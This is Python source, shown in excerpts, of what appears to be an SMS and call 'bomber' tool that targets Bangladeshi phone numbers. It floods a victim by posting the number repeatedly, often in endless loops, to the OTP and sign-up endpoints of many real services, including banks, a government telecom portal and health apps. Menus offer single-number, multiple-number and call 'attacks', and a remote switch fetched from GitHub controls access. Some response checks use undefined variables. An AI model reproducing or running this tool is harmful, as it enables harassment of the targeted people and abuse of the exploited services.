...
try:
    numbers = str.split(requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Siam_Bomber_Data/main/protract.txt').text)
    # LIMIT GET
    global limit_str
    limit_str = requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Siam_Bomber_Data/main/limit.txt').text
    global time_speed
    time_s = requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Siam_Bomber_Data/main/time.txt').text
...
def option_premium():
    ...
    [3] MY AIRTEL
    [4] MY GP 
    [5] ATTACK FROM SINGLE SERVER
    [6] MUTIPLE NUMBER ATTACK
    [7] MULTIPLE NUMBER ATTACK MY ROBI/MY AIRTEL
    [8] CALL BOMBING
    ''' + end
    lolcat(option_premium)
def premium_bomber():
    try:
        aproved = str.split(requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Siam_Bomber_Data/main/aprove.txt').text)
    except:
        printchar(f'{redBold}    NO INTERNET',0.01)
...
def sent_pin(number, amount):
    myAtt = requests.get("https://raw.githubusercontent.com/SIAMRAHMAN000/Siam_Bomber_Data/main/myTar.txt").text
    phone = "+88" + number
    ...
    while i < amount:
        ...
        try:
            ...
            data_hasebpati = '{"business_name":"SIAM","first_name":"Mr ","last_name":"Siam","phone_number":"'+ number + '"}'
            requ_hasebpati_server = requests.post(url_hasebpati, headers=headers_hasebpati, data=data_hasebpati)
...
def main():
    ck_act = requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Siam_Bomber_Data/main/active-Siam_Bomber').text
    # ck_act = 'active'
    clr()
    if 'active' in ck_act:
        pass
    else:
        printchar(f'{yellowBold}  {requests.get("https://raw.githubusercontent.com/SIAMRAHMAN000/Siam_Bomber_Data/main/message-Siam_Bomber").text}', 0.005)
        sys.exit()
    banner()
    option()
...
def attack_premium():
    ...
    if option_choosed == '1' or option_choosed == '01':
        ...
        single_attack()
    elif option_choosed == '6' or option_choosed == '06':
        multi_attack()
        ...
        custom()
    elif option_choosed == '08' or option_choosed == '8':
        call_bomb()
    else:
        attack_premium()
...
def my_robi(number,amount,oparetor):
    ...
    lolcat(bombInfo)
    i = 0
    print(f"{redBold}   TOTAL SMS REQUESTS SENT: {greenBold}", end="")
    while i < amount:
        try:
...
def call_bomb():
    ...
    if len(number) == 11:
        if amount <= 10:
            if number in ['01988981373', '01990722540']:
                printchar(f'{redBold}    FUCK YOU BRO THIS NUMBER MY OWNER SIAM RAHMAN', 0.01)
                sys.exit()
            else:
                i=0
                while i < amount:
                    ...
                    try:
                        ...
                        pass
                    try:
                        url_5 = url = "https://www.fairy-ln.xyz/fairyln/v2/ekbJKysHoKytmupUhds03ROjhy6uDuh8Mp9TkoHo6%2Bk%3D"
                        headers_5 = {
                        "Appcode":"FairyLN",
                        "Content-Type":"application/json",
                        "Accept-Encoding":"gzip, deflate",
                        "User-Agent":"okhttp/5.0.0-alpha.2"}
                        data_5 = '{"mobile":"'+number+'","appCode":"FairyLN"}'
                        resp_5 = requests.post(url_5, headers=headers_5, data=data_5)
                        print(json.dumps(json.loads(resp_4.text), indent=1))
                        time.sleep(480)
                        if i == amount:
                            break
...
def multi_attack():
    banner_premium()
    number_mu = str(input(f"  {random.choice(colorArr)}  ENTER NUMBERS [USE SPACE TO SEPARATE NUMBERS]: {random.choice(colorArr)}"))
...
def att(number_multi):
    ...
    for num in numbers_all:
        try:
            url_esay = "https://core.easy.com.bd/api/v1/registration"
            headers_esay = {"Content-Type":"application/x-www-form-urlencoded"}
            data_easy = 'password_confirmation=SIAMRAHMAN&email=siam@gmail.com&name=Siam&password=SIAMRAHMAN&mobile='+number+'&referrer_key='
            requ_easy_server = requests.post(url_esay, headers=headers_esay, data=data_easy)
            if resp.json()['message'] == "OTP sent Successfully.":
                printchar(f"{greenBold}    A SMS SENT FROM EASY.COM.BD IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM EASY.COM.BD IN +888{num}", 0.001)
        except:
            pass
    for num in numbers_all:
        # MOKAM
    ...
    for num in numbers_all:
        try:
            url_osudpotro = "https://api.osudpotro.com/api/v1/users/send_otp"
            headers_osudpotro = {"Content-Type": "application/json"}
            data_osudpotro = '{"mobile": "'+num+'","deviceToken": "web","language": "en","os": "web"}'
            requ_osudpotro_server = requests.post(url_osudpotro, headers=headers_osudpotro, data=data_osudpotro)
            if requ_osudpotro_server.json()['message'] == 'OTP has been sent to your registered mobile number':
                printchar(f"{greenBold}    A SMS SENT FROM OSUDPOTRO  IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM OSUDPOTRO  IN +888{num}", 0.001)
        except:
            pass
    for num in numbers_all:
        try:
            url_btcl = "https://btcltelesheba.gov.bd/api/ecare/anonym/sendOTP.json"
            headers_btcl = {"Content-Type": "application/json"}
            data_btcl = '{"OTPType": 1,"email": null,"phoneNbr": "'+num+'","userName": ""}'
            requ_btcl_server = requ_osudpotro_server = requests.post(url_btcl, headers=headers_btcl, data=data_btcl)
            if resp.json()['message'] == 'Success！':
                printchar(f"{greenBold}    A SMS SENT FROM BTCL  IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM BTCL  IN +888{num}", 0.001)
        except:
            pass
    for num in numbers_all:
        try:
            url_doctime = "https://admin.doctime.com.bd/api/authenticate"
            headers_doctime = {"Content-Type": "application/json"}
            data_doctime = '{"flag": "https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png","code": "88","contact_no": "'+num+'","country_calling_code": "88"}'
            requ_doctime_server = requests.post(url_doctime, headers=headers_doctime, data=data_doctime)
            if resp.json()['message'] == 'Contact verification code has been sent to 01988981373!':
                printchar(f"{greenBold}    A SMS SENT FROM DOCTIME  IN +888{num}", 0.001)
            else:
                printchar(f"{greenBold}    A SMS SENT FROM DOCTIME  IN +888{num}", 0.001)
        except:
            pass
    ...
    for num in numbers_all:
        try:
            url_quizgiri = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
            headers_quizgiri = {"Content-Type": "application/json"}
            data_quizgiri = '{"phone":"'+num+',"country_code":"+880","fcm_token":null}'
            requ_quizgiri_server = requests.post(url_quizgiri, headers=headers_quizgiri, data=data_quizgiri)
            if resp.json()['message'] == 'OTP sent successful':
                printchar(f"{greenBold}    A SMS SENT FROM QUIZGIRI IN +888{num}", 0.001)
            else:
                printchar(f"{greenBold}    A SMS SENT FROM QUIZGIRI IN +888{num}", 0.001)
        except:
            pass
    ...
    for num in numbers_all:
        try:
            url_tallypay = "https://npapigwnew.nobopay.com/api/v1/user/signup/attempt"
            headers_tallypay = {"Content-Type":"application/json"}
            data_tallypay = '{"name": null,"uuid": "e6ef4b45-4930-4dde-bc7a-8c0f1e2cb6b6","app_type": "TALLYKHATA","device_id": "b9a9f6de8bdc2b01","device_type": "ANDROID","mobile_number": "'+num+'"}'
            requ_tallypay_server = requests.post(url_tallypay, headers=headers_tallypay, data=data_tallypay)
            if requ_tallypay_server.json()['message'] == "OTP send success":
                printchar(f"{greenBold}    A SMS SENT FROM TALLY PAY IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM TALLY PAY IN +888{num}", 0.001)
        except:
            pass

    for num in numbers_all:
        try:
            url_shikho = "https://api.shikho.com/auth/v2/send/sms"
            headers_shikho = {"Content-Type":"application/json"}
            data_shikho = '{"auth_type": "signup","phone": "'+num+'","type": "student"}'
            requ_shikho_server = requests.post(url_shikho, headers=headers_shikho, data=data_shikho)
            if requ_shikho_server.json()['code'] == 200:
                printchar(f"{greenBold}    A SMS SENT FROM SHIKHO IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM SHIKHO IN +888{num}", 0.001)
        except:
            pass
    for num in numbers_all:
        try:
            url_shadhinapp = "https://shadhinapp.com/v3/api/sms"
            headers_shadhinapp = {"Content-Type":"application/json"}
            data_shadhinapp = '{"phone": "'+num+'}'
            requ_shadhinapp_server = requests.post(url_shadhinapp, headers=headers_shadhinapp, data=data_shadhinapp)
            if resp.json()['statusCode'] == 200:
                printchar(f"{greenBold}    A SMS SENT FROM SHADHIN APP IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM SHADHIN APP IN +888{num}", 0.001)
        except:
            pass
    for num in numbers_all:
        try:
            siamnum = num
            siamnum = siamnum.lstrip('0')
            url_hungrynaki = "https://api-v4-2.hungrynaki.com/graphql"
            headers_hungrynaki = {"Content-Type":"application/json"}
            data_hungrunaki = '{"operationName": "CreateOtp","variables": {"phoneNo": "'+siamnum+'","countryCode": "880","fcmToken": "eBeqQ6cHQ4yq0kRtED5WUq:APA91bFF-QiJZzJJRCnACQET97OuuNrT2Wm_NcSXT50Y4wpubnMaMuDeaFTqhSEFaBIK2lw4YQNrQuv5sukBXlrHuMHksCl02YrDFn-ag45m38h0hSKTLTIzRsgQA2ofV7RLaZXS4zS-","deviceUuid": "31f35991-99a5-40e6-acc0-26c4bac2fe19","device": {"deviceType": "ANDROID","osVersionCode": "LOLLIPOP_MR1","osVersionRelease": "6.0.1","deviceBrand": "samsung","deviceModel": "SM-G532F","deviceManufacturer": "samsung","sdk": "23","appInfo": {"versionName": "5.0.8","versionCode": 5000086}}},"query": "mutation CreateOtp($phoneNo:PhoneNumber!, $countryCode:String!, $fcmToken:String, $deviceUuid:String!, $device:CreateDeviceInput!) { createOtp(auth: {phone: $phoneNo, countryCode: $countryCode, deviceToken: $fcmToken, deviceUuid: $deviceUuid}, device:$device) { __typename message statusCode } }"}'
            requ_hungrynaki_server = requests.post(url_hungrynaki, headers=headers_hungrynaki, data=data_hungrunaki)
            if resp.status_code == 200:
                printchar(f"{greenBold}    A SMS SENT FROM HUNGRY NAKI IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM HUNGRY NAKI IN +888{num}", 0.001)
        except:
            pass
    for num in numbers_all:
        try:
            url_hoichoi = "https://prod-api.viewlift.com/identity/signup?platform=android&device=android_phone&site=hoichoitv&deviceId=b9a9f6de8bdc2b01&deviceName=SM-G532F"
            headers_hoichoi = {"Content-Type":"application/json"}
            data_hoichoi = '{"phoneNumber": "'+number+'","whatsappConsent": "true","emailConsent": "true","requestType": "send"}'
            requ_hoichoi_server = requests.post(url_hoichoi, headers=headers_hoichoi, data=data_hoichoi)
            if requ_hoichoi_server.json()["sent"] == "true":
                printchar(f"{greenBold}    A SMS SENT FROM HOICHOI IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM HICHOI IN +888{num}", 0.001)
        except:
            pass
    for num in numbers_all:
        try:
            ...
            requ_hasebpati_server = requests.post(url_hasebpati, headers=headers_hasebpati, data=data_hasebpati)
            if requ_hasebpati_server.json()['status'] == True:
                printchar(f"{greenBold}    A SMS SENT FROM HISHABPATI IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM HISHABPATI IN +888{num}", 0.001)
        except:
            pass
...
def siam1(number):
    try:
        while True:
            url_siam1 = "https://api.v2.medico.bio/patient/passwordless-login"
            headers_siam1 = {"Content-Type": "application/json"}
            data_siam1 = '{"channel":"android","deviceId":"2be3645186db5212","phoneNumber":"' + number + '","type":"newUser","userType":"patient"}'
            requ_siam1 = requests.post(url_siam1, headers=headers_siam1, data=data_siam1, verify=False)
            print(random.choice(colorArr) + requ_siam1.text)
...
def siam2(number):
    try:
        while True:
            url_siam2 = "https://ibanking.uttarabank-bd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber"
            headers_siam2 = {"Content-Type" : "application/json"}
            data_siam2 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+ number +'","otpSms":"","product_id":"111","requestChannel":"MOB","trackingStatus":5}'
            requ_siam2 = requests.post(url_siam2, headers=headers_siam2, data=data_siam2)
            print(random.choice(colorArr) + requ_siam2.text)
    except Exception as err:
        print(err)
def siam3(number):
    try:
        while True:
            url_siam3 = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
            headers_siam3 = {"Content-Type": "application/json"}
            data_siam3 = '{"direct_login": true,"user": {"resend": false,"login": "88' + number + '","type": {"register": true}}}'
            requ_siam3 = requests.post(url_siam3, headers=headers_siam3, data=data_siam3)
            print(random.choice(colorArr) + requ_siam3.text)
    except Exception as err:
        print(err)
def siam4(number):
    try:
        while True:
            url_siam4 = "https://120.50.19.226:9515/VerifIDEXT/api/CustOnBoarding/VerifyMobileNumber"
            headers_siam4 = {'Content-Type': 'application/json'}
            data_siam4 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"230","requestChannel":"MOB","trackingStatus":5}'
            requ_siam4 = requests.post(url_siam4, headers=headers_siam4, data=data_siam4, verify=False)
            print(random.choice(colorArr) + requ_siam4.text)
    except Exception as err:
        print(err)
...
def siam5(number):
    try:
        while True:
            url_siam5 = "https://api.hishabpati.com/api/v1/merchant/register/otp"
            headers_siam5 = {'Content-Type': 'application/json'}
            data_siam5 = '{"business_name": "SIAM ","first_name": "SIAM","last_name": "RAHMAN","phone_number": "'+number+'"}'
            requ_siam5 = requests.post(url_siam5, headers=headers_siam5, data=data_siam5, verify=False)
            print(random.choice(colorArr) + requ_siam5.text)
    except Exception as err:
        print(err)
